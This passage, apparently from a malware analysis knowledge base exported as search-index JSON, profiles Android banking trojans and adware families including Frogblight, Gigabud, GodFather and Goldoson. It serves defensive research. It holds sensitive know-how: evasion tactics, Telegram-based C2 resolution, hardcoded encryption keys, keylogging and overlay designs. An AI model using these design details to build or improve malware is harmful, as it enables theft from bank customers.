toolchain.</p>"},{"location":"malware/families/fluhorse/#versions-and-evolution","title":"Versions and Evolution","text":"Period Development May 2022 Earliest observed FluHorse activity May 2023 Check Point Research publishes initial disclosure, samples unpacked June 2023 Packed samples observed, indicating increased operational maturity 2023-present Ongoing campaigns with new infrastructure and apps deployed monthly"},{"location":"malware/families/fluhorse/#why-flutter-matters-for-offense","title":"Why Flutter Matters for Offense","text":"<p>For detailed Flutter reverse engineering methodology, see the Flutter framework page.</p> <p>Flutter's adoption by malware authors represents a practical shift in Android threat development. The framework provides several advantages:</p> <ul> <li>Analysis barrier: the Dart AOT snapshot in <code>libapp.so</code> cannot be processed by jadx, apktool, or other standard Android RE tools. Analysts must use specialized Dart snapshot parsers, which are immature and frequently break across Flutter versions.</li> <li>Cross-platform potential: Flutter natively supports Android, iOS, web, and desktop from a single codebase, though FluHorse has only been observed on Android.</li> <li>Rapid UI development: Flutter's widget system makes it straightforward to create convincing replicas of legitimate app interfaces, improving phishing effectiveness.</li> <li>Low malicious footprint in DEX: since the malicious logic lives in native code (<code>libapp.so</code>), the Android manifest and DEX classes contain almost nothing suspicious, potentially evading signature-based detection focused on Dalvik bytecode.</li> </ul>"},{"location":"malware/families/fluhorse/#references","title":"References","text":"<ul> <li>Eastern Asian Android Assault - FluHorse - Check Point Research</li> <li>FluHorse - Check Point Blog</li> <li>Fortinet Reverses Flutter-based Android Malware \"Fluhorse\"</li> <li>Virus Bulletin 2024 - Android Flutter Malware</li> <li>New Android Malware FluHorse Targeting East Asian Markets - The Hacker News</li> <li>Fluhorse: Flutter-Based Android Malware Targets Credit Cards and 2FA Codes - The Hacker News</li> <li>New Android FluHorse malware steals your passwords, 2FA codes - BleepingComputer</li> <li>FluHorse - Malpedia</li> </ul>"},{"location":"malware/families/frogblight/","title":"Frogblight","text":"<p>Frogblight is a Turkish banking trojan distributed via smishing as fake court case notification documents. Kaspersky published the analysis in August 2025, documenting a banking trojan that records keystrokes via a custom InputMethodService (keyboard) and uses geofencing to avoid execution in the United States, a common tactic to reduce exposure to US-based security researchers and sandboxes. Kaspersky noted possible connections to the Coper MaaS ecosystem, which traces lineage back to Exobot through ExobotCompact/Octo.</p>"},{"location":"malware/families/frogblight/#overview","title":"Overview","text":"Attribute Details First Seen 2025 Last Seen Active Status Active, under development Type Banking trojan with keylogging via custom keyboard Attribution Unknown; possible Coper MaaS connection Aliases None known"},{"location":"malware/families/frogblight/#vendor-names","title":"Vendor Names","text":"Vendor Name Kaspersky HEUR:Trojan-Banker.AndroidOS.Frogblight ESET Android/Spy.Banker.Frogblight"},{"location":"malware/families/frogblight/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Kaspersky identified possible connections to the Coper MaaS operation, which is part of the Exobot lineage:</p> <pre><code>Exobot (2016) -&gt; ExobotCompact/Coper (2021) -&gt; Octo (2022)\n                                              -&gt; Frogblight (2025)?\n</code></pre> <p>If the Coper connection is confirmed, Frogblight would join Octo as a descendant of the Exobot lineage. However, this relationship requires further analysis and has not been definitively established.</p>"},{"location":"malware/families/frogblight/#distribution","title":"Distribution","text":"Vector Details Smishing SMS messages impersonating Turkish court notifications Fake court documents APKs disguised as court case viewing applications Social engineering Urgency-based lures about pending legal proceedings <p>The court case impersonation creates strong urgency: recipients believe they have pending legal matters requiring immediate attention, motivating them to install the \"document viewer\" app. This social engineering approach parallels Copybara's TOAD-based delivery and Zanubis's government impersonation, where official-seeming communications compel installation.</p>"},{"location":"malware/families/frogblight/#capabilities","title":"Capabilities","text":"Capability Description Custom keyboard keylogging Records keystrokes via malicious InputMethodService Overlay attacks Credential phishing overlays over Turkish banking apps SMS interception Reads and intercepts OTP codes Geofencing Refuses to execute on devices with US locale/SIM Screen recording Captures device screen activity Contact exfiltration Uploads contact list Persistence Prevents uninstallation via accessibility"},{"location":"malware/families/frogblight/#custom-keyboard-keylogging","title":"Custom Keyboard Keylogging","text":"<p>Frogblight's primary keylogging mechanism uses Android's InputMethodService API to register as a custom input method (keyboard). Once enabled, the custom keyboard captures every keystroke entered by the user across all applications, including banking apps, messaging apps, and browsers. This approach differs from accessibility-based keylogging used by most banking trojans (Cerberus, Anubis, Hook):</p> Method Pros Cons Accessibility keylogging Captures from any keyboard Increasingly restricted by Android Custom keyboard (Frogblight) Direct keystroke access, harder to detect Requires user to enable the keyboard"},{"location":"malware/families/frogblight/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/frogblight/#inputmethodservice-implementation","title":"InputMethodService Implementation","text":"<p>The malware registers an InputMethodService that functions as a system keyboard:</p> <ol> <li>During installation, the user is prompted to enable the custom keyboard</li> <li>Once enabled, it replaces the default keyboard for all text input</li> <li>All keystrokes are logged and sent to C2</li> <li>The keyboard UI mimics a standard Android keyboard to avoid suspicion</li> </ol>"},{"location":"malware/families/frogblight/#geofencing","title":"Geofencing","text":"<p>Frogblight checks device locale, SIM card country code, and IP geolocation. If US-based indicators are detected, the malware deactivates. This reduces the chance of analysis by US-based security researchers and sandbox environments, which are disproportionately used by major security vendors.</p> Check Method SIM country TelephonyManager.getSimCountryIso() Device locale Locale.getDefault() IP geolocation HTTP request to IP geolocation service"},{"location":"malware/families/frogblight/#c2-communication","title":"C2 Communication","text":"<ul> <li>HTTPS-based communication</li> <li>Device registration with hardware fingerprint</li> <li>Command polling for overlay updates and target list</li> <li>Real-time keystroke exfiltration</li> </ul>"},{"location":"malware/families/frogblight/#target-regions","title":"Target Regions","text":"Region Details Turkey Primary and exclusive target <p>Frogblight targets major Turkish banks and financial institutions. The geofencing exclusion of US devices and the Turkish court document lures confirm the narrow geographic focus.</p>"},{"location":"malware/families/frogblight/#notable-campaigns","title":"Notable Campaigns","text":"<p>2025: Kaspersky publishes Frogblight analysis, documenting the custom keyboard keylogging approach, court case smishing lures, and geofencing. The research notes possible connections to the Coper MaaS ecosystem, suggesting potential code sharing with the Exobot/Octo lineage.</p>"},{"location":"malware/families/frogblight/#references","title":"References","text":""},{"location":"malware/families/gigabud/","title":"Gigabud","text":"<p>Gigabud is an Android banking RAT from the GoldFactory threat group, the same Chinese-speaking cybercrime operation behind GoldPickaxe and GoldDigger. Cyble first documented Gigabud in January 2023 after observing it impersonating government agencies and banking apps across Southeast Asia, with activity dating back to at least July 2022. Unlike most banking trojans that rely on HTML overlay attacks for credential theft, Gigabud uses screen recording as its primary data capture mechanism, allowing it to record everything the victim does within targeted banking applications. A September 2024 investigation by Zimperium zLabs revealed that Gigabud shares distribution infrastructure with SpyNote, with both families protected by the Virbox packer, indicating coordinated deployment by the same threat actor.</p>"},{"location":"malware/families/gigabud/#overview","title":"Overview","text":"Attribute Details First Seen July 2022 Status Active, under continued development Type Banking RAT, credential stealer Attribution GoldFactory group (Chinese-speaking threat actors) Aliases Gigabud RAT, Gigabud.Loan (data-theft variant), Gigaflower (successor) Target Region Southeast Asia (Thailand, Vietnam, Philippines, Indonesia), Peru, expanding globally Distribution Phishing sites impersonating government agencies, banks, and loan apps Notable Feature Screen recording for credential capture instead of overlay attacks"},{"location":"malware/families/gigabud/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Gigabud belongs to the GoldFactory threat group's malware ecosystem, which includes several related Android banking trojan families. Cyble's August 2024 analysis established clear code-level overlap between Gigabud and GoldDigger, confirming shared authorship. Both families use the native library <code>libstrategy.so</code> for interacting with UI elements of targeted banking applications, and both adopted the Virbox packer for protection.</p> Family Relationship GoldDigger Shares code overlap, common <code>libstrategy.so</code> library, and Virbox packer usage. Android banking trojan targeting Vietnamese banks. GoldPickaxe Sibling family from GoldFactory. Introduced facial biometric theft for deepfake-based bank verification bypass. Has both Android and iOS variants. GoldDiggerPlus Enhanced GoldDigger variant with real-time voice communication during active device compromise. SpyNote Shared distribution infrastructure. Zimperium identified 79 phishing sites and 11 C2 servers distributing both Gigabud and SpyNote. Gigaflower Pre-release successor variant discovered by Group-IB in testing infrastructure. Likely next evolution of the Gigabud line."},{"location":"malware/families/gigabud/#distribution","title":"Distribution","text":"Vector Details Phishing sites Fake websites impersonating Google Play Store listings, government portals, and banking apps Smishing SMS messages with links to phishing sites, often under the pretext of tax audits or refund claims Social engineering Links distributed via instant messengers and social media Fake loan apps Gigabud.Loan variant poses as fictitious financial institutions offering loans Government impersonation Apps disguised as official government agency tools <p>Gigabud distribution is regionally tailored. In Thailand, operators impersonate the Department of Special Investigation (DSI) and revenue agencies. The DSI itself issued a warning in July 2022 about phishing sites impersonating its website and distributing the RAT. The Thailand Telecommunication Sector CERT (TTC-CERT) separately discovered the malware distributed as \"Revenue.apk\" and published a technical advisory in September 2022.</p> <p>In the Philippines, the malware impersonates banking apps. In Peru, it poses as government tax agencies. Distribution infrastructure has expanded significantly since mid-2024, with Zimperium documenting 79 phishing sites across a coordinated campaign targeting users globally.</p>"},{"location":"malware/families/gigabud/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/gigabud/#gigabudrat","title":"Gigabud.RAT","text":"Capability Implementation Screen recording Primary credential capture method, records victim activity within banking apps Accessibility service abuse Enables screen recording, gesture simulation, and UI interaction Remote device access Full remote control of victim device through gesture simulation (TouchAction) Automated payments Performs transactions from victim's device via accessibility-driven gestures 2FA bypass Intercepts authentication codes and performs gestures to complete verification flows Clipboard manipulation Replaces bank card numbers in clipboard with attacker-controlled numbers Credential harvesting Captures login credentials through screen recording rather than overlay injects Delayed malicious execution Does not execute malicious actions until the user is authorized into the app, evading sandbox analysis"},{"location":"malware/families/gigabud/#screen-recording-vs-overlay-attacks","title":"Screen Recording vs. Overlay Attacks","text":"<p>Gigabud's use of screen recording instead of HTML overlay attacks is a deliberate design choice. Most Android banking trojans display fake login screens (overlays) on top of legitimate banking apps to capture credentials. Gigabud instead records the victim's screen while they interact with the real banking app. This approach has trade-offs:</p> <ul> <li>Captures credentials entered into the actual banking app, not a fake copy</li> <li>Records the full session including navigation, account details, and balance information</li> <li>Avoids the need to maintain overlay inject templates for each target bank</li> <li>Pairs with remote device access to allow operators to take over mid-session</li> <li>Less susceptible to overlay detection mechanisms that some banking apps implement</li> </ul>"},{"location":"malware/families/gigabud/#gigabudloan","title":"Gigabud.Loan","text":"<p>Gigabud.Loan is a stripped-down variant that lacks RAT capabilities entirely. It operates as a data harvester disguised as fake loan applications from fictitious financial institutions. The Loan variant shares the same architecture and code-signing certificate as Gigabud.RAT.</p> Data Collected Details Personal information Full name, identity number Identity documents Photos of national identity documents, digital signatures Financial data Bank card information, income details Background information Education, employment <p>Group-IB detected more than 400 Gigabud.RAT samples and more than 20 Gigabud.Loan samples between 2022 and 2023.</p>"},{"location":"malware/families/gigabud/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/gigabud/#accessibility-service-abuse","title":"Accessibility Service Abuse","text":"<p>Gigabud's core functionality depends on the Android Accessibility Service. The <code>TouchAction</code> feature abuses accessibility to simulate user gestures on the device, enabling:</p> <ul> <li>Screen recording of banking app sessions</li> <li>Automated gesture sequences to complete transactions</li> <li>Navigation through banking app interfaces on behalf of the operator</li> <li>Bypassing authentication steps including 2FA prompts</li> </ul>"},{"location":"malware/families/gigabud/#delayed-execution","title":"Delayed Execution","text":"<p>A distinctive characteristic of Gigabud is its delayed malicious execution. The RAT does not activate malicious functionality until the victim has been authenticated into the fake application by a fraudster on the other end. This makes automated sandbox detection significantly harder, as the malware appears benign during initial analysis windows.</p>"},{"location":"malware/families/gigabud/#shared-infrastructure-with-spynote","title":"Shared Infrastructure with SpyNote","text":"<p>Zimperium's September 2024 investigation uncovered that Gigabud and SpyNote share distribution infrastructure:</p> Finding Details Phishing sites 79 identified, distributing both families C2 servers 11 shared command-and-control servers Targeted apps 50+ financial apps (40+ banks, 10 cryptocurrency platforms) Packer Both families protected by Virbox packer Code overlap Code similarities between SpyNote and Gigabud samples suggest shared authorship <p>This infrastructure overlap indicates Gigabud is deployed alongside SpyNote in coordinated campaigns, with the banking RAT and the general-purpose RAT serving complementary roles.</p>"},{"location":"malware/families/gigabud/#anti-analysis","title":"Anti-Analysis","text":"Technique Details Virbox packer Commercial packer providing DEX encryption, native code protection, anti-debugging, and anti-emulator checks Delayed execution Malicious behavior requires operator interaction, bypassing automated sandbox analysis ZIP format exploitation Evasion techniques exploiting the zip file format, shared with GoldDigger variants <code>libstrategy.so</code> Native library handling UI interaction logic, harder to analyze than Dalvik bytecode"},{"location":"malware/families/gigabud/#packerprotection","title":"Packer/Protection","text":"Packer Details Virbox Commercial packer providing DEX encryption, native code protection, anti-debugging, and anti-emulator checks"},{"location":"malware/families/gigabud/#permissions","title":"Permissions","text":"Permission Purpose BIND_ACCESSIBILITY_SERVICE Core dependency for screen recording, gesture simulation, and UI interaction SYSTEM_ALERT_WINDOW Display overlay elements during credential capture READ_SMS Intercept SMS for 2FA bypass RECEIVE_SMS Real-time SMS interception READ_PHONE_STATE Device fingerprinting INTERNET C2 communication RECEIVE_BOOT_COMPLETED Persistence across reboots"},{"location":"malware/families/gigabud/#target-regions-and-campaigns","title":"Target Regions and Campaigns","text":"Period Targets Activity July 2022 Thailand First campaigns impersonating DSI and revenue agencies. DSI issues public warning. September 2022 Thailand TTC-CERT discovers \"Revenue.apk\" variant and publishes advisory Late 2022 Thailand, Peru, Philippines Expansion to impersonate banking and government apps in new regions January 2023 Thailand, Peru, Philippines Cyble publishes first public analysis August 2023 Thailand, Vietnam, Philippines, Indonesia, Peru Group-IB publishes comprehensive analysis documenting 400+ RAT samples and 20+ Loan samples August 2024 Expanding globally Cyble documents code overlap between Gigabud and GoldDigger. New variants using Virbox packer detected. September 2024 50+ financial institutions worldwide Zimperium reveals shared infrastructure with SpyNote, 79 phishing sites, 11 C2 servers June-July 2024 onward Bangladesh, Indonesia, Mexico, South Africa, Ethiopia Significant surge in new Gigabud variants and distribution volume Late 2024-2025 Southeast Asia Group-IB uncovers GoldFactory deploying modified banking apps, driving 11,000+ infections. Pre-release Gigaflower successor variant found in testing infrastructure."},{"location":"malware/families/gigabud/#related-families","title":"Related Families","text":"Family Relationship GoldPickaxe Sibling within GoldFactory ecosystem. Both target Southeast Asian banking, but GoldPickaxe focuses on biometric theft for deepfake fraud rather than screen recording. GoldDigger Direct code overlap with Gigabud, shared <code>libstrategy.so</code> native library, and common Virbox packer usage. Predecessor within the GoldFactory group. SpyNote Shared distribution infrastructure (79 phishing sites, 11 C2 servers). Both protected by Virbox packer. SpyNote provides general RAT capabilities alongside Gigabud's banking-focused functionality."},{"location":"malware/families/gigabud/#references","title":"References","text":"<ul> <li>Gigabud RAT: New Android RAT Masquerading as Government Agencies - Cyble (January 2023)</li> <li>Breaking down Gigabud banking malware with Group-IB Fraud Matrix - Group-IB (August 2023)</li> <li>Overlap Between Golddigger &amp; Gigabud Android Malware - Cyble (August 2024)</li> <li>A Network of Harm: Gigabud Threat and Its Associates - Zimperium (September 2024)</li> <li>Gold Rush is back to APAC: Group-IB unveils first iOS trojan stealing your face - Group-IB</li> <li>Gigabud RAT Android Banking Malware Targets Institutions Across Countries - The Hacker News</li> <li>Gigabud - Malpedia</li> </ul>"},{"location":"malware/families/godfather/","title":"GodFather","text":"<p>GodFather is the modern successor to Anubis, built on its leaked source code but substantially rewritten for current Android versions. First detected by Group-IB in June 2021 and publicly disclosed by ThreatFabric in March 2022, GodFather targets 400+ financial applications across 16 countries using dynamically generated overlay WebViews. Its operators retrieve C2 addresses from encrypted Telegram channel descriptions, a technique that provides resilient infrastructure with minimal effort. The malware explicitly avoids post-Soviet country devices, strongly indicating Russian-speaking development.</p>"},{"location":"malware/families/godfather/#overview","title":"Overview","text":"Property Value First Seen June 2021 (Group-IB detection); publicly documented March 2022 Last Seen / Status Active, ongoing development with v2 native code migration Type Banking trojan, infostealer Attribution Russian-speaking operators (inferred from language-based kill switch) Aliases None widely established"},{"location":"malware/families/godfather/#origin-and-lineage","title":"Origin and Lineage","text":"<p>GodFather's codebase derives directly from Anubis, whose source code was leaked in January 2019. The developers took the Anubis code as a foundation and modernized it to work on newer Android versions, where many of Anubis's original techniques (particularly overlay injection via <code>SYSTEM_ALERT_WINDOW</code>) had been restricted by Google.</p> <p>Group-IB's detailed analysis confirmed the Anubis lineage through code structure comparison, but noted that the GodFather developers rewrote substantial portions: the overlay delivery mechanism, C2 communication protocol, and evasion techniques are all new. This is not a simple Anubis fork with cosmetic changes but a ground-up rebuild using Anubis as scaffolding.</p> <p>GodFather sits within the broader ecosystem of Anubis-derived malware. Where Ginp selectively borrowed Anubis components, GodFather represents a more comprehensive modernization effort.</p>"},{"location":"malware/families/godfather/#distribution","title":"Distribution","text":"<p>Google Play droppers: Group-IB identified GodFather distributed through decoy applications hosted on Google Play. These apps mimic legitimate utilities and pass initial screening before downloading the banking payload.</p> <p>Fake app impersonation: Cyble discovered GodFather samples masquerading as the MYT Muzik app, a popular Turkish music streaming application. The fake app was visually identical to the legitimate version, targeting Turkish users specifically.</p> <p>Third-party stores and phishing: Distribution also occurs through third-party app stores, phishing pages, and SMS lures directing victims to malicious download sites.</p> <p>The malware's language-based kill switch (see Target Regions below) means distribution campaigns are geographically selective, avoiding markets where the malware would self-terminate.</p>"},{"location":"malware/families/godfather/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/godfather/#core-feature-set","title":"Core Feature Set","text":"Capability Implementation Dynamic overlay injection Fetches overlay WebView HTML from C2, generates phishing screens matching targeted apps Keylogging Accessibility Service captures all text input events Screen recording Records device screen via MediaProjection or Accessibility Screenshot capture Takes screenshots on demand or triggered by targeted app launch SMS interception Reads and hides incoming SMS for OTP/2FA theft Call log harvesting Exfiltrates call history Contact exfiltration Steals device contact list Notification interception Reads notification content, including push-based 2FA codes Device Admin abuse Requests admin privileges to prevent uninstallation Google Play Protect bypass Disables Play Protect via Accessibility navigation Proxy/VNC Remote device interaction through accessibility-based commands USSD execution Executes USSD codes on the device Call forwarding Forwards incoming calls to attacker-controlled numbers"},{"location":"malware/families/godfather/#version-evolution","title":"Version Evolution","text":"Version Period Key Changes v1 2021-2023 Anubis-derived Java codebase, Telegram-based C2 resolution, Blowfish encryption, overlay injection targeting 400+ apps v2 2024+ Migration to native code, reduced permission footprint, heavier reliance on Accessibility Service, expanded to 500+ targeted apps, new geographic targets (Japan, Greece, Singapore, Azerbaijan) v3 2025 On-device virtualization: creates isolated virtual environment, installs real banking apps inside it, intercepts all interactions at runtime. Hooks OkHttp <code>build()</code> to inject network interceptor. Turkish bank focus. ZIP manipulation + manifest obfuscation + <code>$JADXBLOCK</code> fields to defeat static analysis."},{"location":"malware/families/godfather/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/godfather/#c2-resolution-via-telegram","title":"C2 Resolution via Telegram","text":"<p>GodFather's most distinctive technical feature is its C2 address retrieval mechanism:</p> <ol> <li>The malware contains a hardcoded link to an attacker-controlled Telegram channel</li> <li>It fetches the channel description via HTTP request</li> <li>The description contains a Base64-encoded, Blowfish-encrypted string</li> <li>The malware decrypts the string using Blowfish in ECB mode with the hardcoded key <code>ABC</code></li> <li>The decrypted result is the active C2 URL</li> </ol> <p>This approach provides the operators with trivially updatable C2 infrastructure: changing the active server requires only editing a Telegram channel description. Group-IB documented this mechanism in detail, and independent technical analysis confirmed the Blowfish ECB implementation.</p>"},{"location":"malware/families/godfather/#c2-communication-encryption","title":"C2 Communication Encryption","text":"<p>After resolving the C2 address, ongoing bot-to-server communication uses AES/CBC/NoPadding with:</p> <ul> <li>IV: <code>fedcba9876543210</code></li> <li>Key: <code>0123456789abcdef</code></li> </ul> <p>These values are hardcoded in the malware. The use of static, predictable encryption parameters suggests the operators prioritize operational simplicity over cryptographic strength, relying instead on the Telegram-based C2 resolution layer for infrastructure resilience.</p>"},{"location":"malware/families/godfather/#overlay-injection-mechanism","title":"Overlay Injection Mechanism","text":"<p>GodFather generates overlay screens dynamically rather than bundling static HTML:</p> <ol> <li>The bot sends the C2 a list of installed applications</li> <li>The C2 returns a target list with corresponding overlay URLs</li> <li>When a targeted app enters the foreground (detected via Accessibility events), the malware loads the overlay URL in a WebView positioned over the legitimate app</li> <li>Credentials entered into the WebView are captured and sent to the C2</li> </ol> <p>The C2-hosted overlay approach means operators can update, add, or modify phishing screens without pushing a new APK to infected devices.</p>"},{"location":"malware/families/godfather/#language-based-kill-switch","title":"Language-Based Kill Switch","text":"<p>On first execution, GodFather checks the device's configured language. If the device language matches any of the following, the malware terminates and does not execute:</p> <ul> <li>Russian</li> <li>Azerbaijani</li> <li>Armenian</li> <li>Belarusian</li> <li>Kazakh</li> <li>Kyrgyz</li> <li>Moldovan</li> <li>Tajik</li> <li>Uzbek</li> </ul> <p>This post-Soviet language exclusion is a strong indicator of Russian-speaking developers protecting their local operating environment, a pattern shared with Cerberus, Hook, and other MaaS families.</p>"},{"location":"malware/families/godfather/#v2-native-code-migration","title":"v2 Native Code Migration","text":"<p>Cyble's analysis of GodFather v2 documents a significant architectural shift: core malicious logic has been moved from Java/Kotlin to native code (C/C++ via JNI). The native functions implement:</p> <ul> <li>Injection URL loading into WebView</li> <li>Automated gesture execution</li> <li>C2 connection establishment</li> <li>Keylogging</li> </ul> <p>This migration makes static analysis substantially harder, as native code is not decompilable to readable Java. The v2 variant also operates with fewer declared permissions, shifting more functionality to Accessibility Service abuse.</p>"},{"location":"malware/families/godfather/#target-regions-and-financial-institutions","title":"Target Regions and Financial Institutions","text":"<p>GodFather's targeting is broad but weighted toward specific regions:</p> Region Details Turkey Primary target; fake MYT Muzik app, Turkish banking overlay templates United States Major US banks and crypto exchanges United Kingdom UK banking apps Spain Spanish banks and financial services Italy Italian banking apps Canada Canadian financial institutions Germany BaFin issued a public warning about GodFather targeting German banking users France French banking apps Japan Added in v2 expansion Singapore Added in v2 expansion Greece Added in v2 expansion Azerbaijan Added in v2 expansion <p>The target list encompasses:</p> <ul> <li>215+ banking applications</li> <li>94 cryptocurrency wallet providers</li> <li>110+ cryptocurrency exchange platforms</li> </ul> <p>Cyble's v2 analysis documented expansion to 500+ targeted applications with new geographic reach.</p> <p>Excluded regions: All post-Soviet language countries (Russia, Belarus, Kazakhstan, Uzbekistan, Armenia, Azerbaijan, Kyrgyzstan, Tajikistan, Moldova).</p>"},{"location":"malware/families/godfather/#notable-campaigns","title":"Notable Campaigns","text":"<p>June 2021, initial detection: Group-IB first detected GodFather samples in the wild. At this stage the malware was in early development, with a smaller target list and less sophisticated evasion.</p> <p>March 2022, ThreatFabric disclosure: ThreatFabric publicly documented GodFather as part of their broader analysis of the Android banking trojan surge fueled by the Anubis and Cerberus source code leaks. They confirmed the Anubis code lineage and noted the modernized overlay mechanism.</p> <p>October 2022, MYT Muzik campaign (Turkey): Cyble identified GodFather samples impersonating the popular Turkish music app MYT Muzik. The campaign specifically targeted Turkish banking users with localized overlay templates.</p> <p>December 2022, Group-IB full report: Group-IB published their comprehensive analysis covering 400+ targeted apps across 16 countries. The report detailed the Telegram-based C2 mechanism, Blowfish encryption, and post-Soviet language exclusion. Germany's BaFin financial regulator issued a public advisory in response.</p> <p>2023, EclecticIQ European expansion analysis: EclecticIQ documented GodFather's expansion into additional European markets, with updated overlay templates targeting banks not present in earlier campaigns.</p> <p>2024, Cyble v2 analysis (500+ targets): Cyble analyzed the second major version of GodFather, documenting the native code migration, reduced permission footprint, expanded target list of 500+ apps, and new geographic coverage including Japan, Singapore, Greece, and Azerbaijan.</p> <p>2024, Cyble follow-up on evolved capabilities: Cyble published additional analysis covering new automated commands for device interface navigation, gesture execution on target apps, screen brightness manipulation, and notification settings control.</p> <p>July 2025, virtualization-based v3: Zimperium zLabs uncovered a major evolution: GodFather v3 creates an on-device virtual environment, installs the legitimate banking or crypto app inside it, and intercepts all user interactions at runtime. Instead of overlay phishing, the victim interacts with the real banking app running in a controlled sandbox. The malware hooks OkHttp's <code>build()</code> method to inject a custom interceptor that logs all network requests, capturing credentials and transaction data from the real app's traffic. This represents a fundamental shift from the overlay injection model used since GM Bot's 2014 invention to a virtualization-based interception approach. Targets 500+ banking and crypto apps, currently focused on Turkish banks.</p>"},{"location":"malware/families/godfather/#references","title":"References","text":""},{"location":"malware/families/goldoson/","title":"Goldoson","text":"<p>Goldoson is a malicious advertising SDK discovered embedded in 60+ legitimate applications with over 100 million cumulative downloads on Google Play and Korea's ONE store. McAfee published the discovery in April 2023, documenting a supply chain compromise where app developers unknowingly included a third-party SDK containing data collection and ad click fraud capabilities. The SDK collected installed app lists, Wi-Fi and Bluetooth device information, and GPS location while performing background ad click fraud.</p>"},{"location":"malware/families/goldoson/#overview","title":"Overview","text":"Attribute Details First Seen 2023 (discovery) Last Seen 2023 (remediated after disclosure) Status Remediated, apps updated or removed Type Malicious SDK, adware, data harvester Attribution Unknown SDK developer Aliases None known"},{"location":"malware/families/goldoson/#vendor-names","title":"Vendor Names","text":"Vendor Name McAfee Android/Goldoson Kaspersky not-a-virus:HEUR:AdWare.AndroidOS.Goldoson AhnLab PUP/Android.Goldoson"},{"location":"malware/families/goldoson/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Goldoson is not a standalone malware family but a malicious SDK distributed through a third-party advertising library. The compromise follows the same supply chain attack pattern as Necro (Coral SDK) and Triada (firmware-level), though at the SDK/library level rather than the system level. Developers integrating the SDK into their apps were likely unaware of its data collection and ad fraud capabilities.</p>"},{"location":"malware/families/goldoson/#distribution","title":"Distribution","text":"<p>Goldoson reached users through legitimate apps on two major Korean app stores:</p> Platform App Count Combined Downloads Google Play 60+ apps 100M+ ONE Store (Korea) 8+ apps Additional millions <p>Affected apps included popular Korean utility, entertainment, and lifestyle applications. The developers were victims of the supply chain compromise, not participants.</p>"},{"location":"malware/families/goldoson/#remediation","title":"Remediation","text":"<p>After McAfee's disclosure:</p> <ul> <li>Google removed non-compliant apps from Play Store</li> <li>Developers who updated their apps to remove the Goldoson SDK had apps reinstated</li> <li>ONE store conducted a parallel review and cleanup</li> </ul>"},{"location":"malware/families/goldoson/#capabilities","title":"Capabilities","text":"Capability Description Installed app inventory Collects list of all installed applications Wi-Fi device scanning Records nearby Wi-Fi access points and connected devices Bluetooth device scanning Records nearby Bluetooth devices GPS location tracking Periodic location collection Background ad clicking Loads and clicks ads in hidden WebViews Device fingerprinting Hardware identifiers, OS version, build information"},{"location":"malware/families/goldoson/#data-collection","title":"Data Collection","text":"<p>The SDK operated on a schedule, periodically collecting and uploading device data:</p> <ul> <li>Every 2 days: installed app list, location, Wi-Fi/Bluetooth scan results</li> <li>Continuous: background ad click fraud for revenue generation</li> <li>Data uploaded to a remote server controlled by the SDK developer</li> </ul>"},{"location":"malware/families/goldoson/#ad-click-fraud","title":"Ad Click Fraud","text":"<p>Goldoson loaded advertising URLs in hidden WebViews and simulated clicks on ads without user visibility. This generated fraudulent advertising revenue for the SDK operators at the expense of advertisers and users' battery and data.</p>"},{"location":"malware/families/goldoson/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/goldoson/#sdk-integration","title":"SDK Integration","text":"<p>Many affected apps were games built with Unity or native Java, where the Goldoson SDK was embedded alongside legitimate advertising libraries. The SDK was distributed as a standard advertising library. Developers added it to their projects expecting legitimate ad functionality:</p> <ul> <li>Standard Android library (.aar) format</li> <li>Registered as a content provider for auto-initialization</li> <li>Minimal visible API surface for ad display</li> <li>Hidden data collection and click fraud modules activated in background</li> </ul>"},{"location":"malware/families/goldoson/#remote-configuration","title":"Remote Configuration","text":"<p>The SDK's behavior was controlled by a remote configuration server:</p> Parameter Function Collection interval How frequently device data is harvested Ad URLs Which ads to load and click Feature flags Enable/disable specific collection capabilities Target packages Which installed apps to report <p>This remote configuration allowed the operator to adjust behavior, potentially activating or deactivating data collection to evade detection during security reviews.</p>"},{"location":"malware/families/goldoson/#target-regions","title":"Target Regions","text":"Region Details South Korea Primary target, ONE store presence Global Google Play distribution reached worldwide <p>The affected apps were primarily popular with Korean users, but their Google Play presence meant global availability. The data collection capabilities operated regardless of user location.</p>"},{"location":"malware/families/goldoson/#notable-campaigns","title":"Notable Campaigns","text":"<p>2023, April: McAfee discovers Goldoson SDK embedded in 60+ Google Play apps with 100M+ downloads and additional apps on Korea's ONE store. McAfee coordinates disclosure with Google and app developers. Affected apps are either removed or updated to remove the malicious SDK.</p>"},{"location":"malware/families/goldoson/#references","title":"References","text":""},{"location":"malware/families/goldpickaxe/","title":"GoldPickaxe","text":"<p>GoldPickaxe is an Android and iOS banking trojan from the GoldFactory threat group, a Chinese-speaking cybercrime operation that develops the broader GoldDigger malware family. First observed in 2024 as an evolution of the GoldDigger trojan (2023), GoldPickaxe introduced a novel biometric theft technique: it tricks victims into recording facial videos that are then used to create deepfake content capable of bypassing bank face-verification systems. With variants targeting both Android and iOS, cross-platform reach across Southeast Asia and expanding into Latin America and South Africa, GoldPickaxe represents a significant escalation in mobile banking fraud capabilities.</p>"},{"location":"malware/families/goldpickaxe/#overview","title":"Overview","text":"Attribute Details First Seen 2023 (GoldDigger), 2024 (GoldPickaxe) Status Active Type Banking trojan, biometric stealer Aliases GoldDigger (predecessor), GoldDiggerPlus (Android sibling) Attribution GoldFactory group (Chinese-speaking threat actors) Distribution Localized apps, social engineering, smishing"},{"location":"malware/families/goldpickaxe/#origin-and-lineage","title":"Origin and Lineage","text":"<p>The GoldFactory threat group is a Chinese-speaking cybercrime operation responsible for a family of Android banking trojans targeting Southeast Asian financial institutions. The lineage begins with GoldDigger, first documented in 2023 as a banking trojan targeting Vietnamese users.</p> <p>GoldDigger (2023): The original family member, an Android banking trojan targeting Vietnamese banks through overlay attacks and accessibility service abuse. GoldDigger established the group's operational model of targeting Southeast Asian markets with highly localized lures.</p> <p>GoldDiggerPlus (2023-2024): An enhanced Android variant that expanded the capability set beyond the original GoldDigger. It added real-time voice communication with victims through operator-initiated calls, allowing social engineering during active device compromise.</p> <p>GoldPickaxe (2024): The most technically advanced variant, introducing biometric data theft as a core capability. GoldPickaxe collects facial video 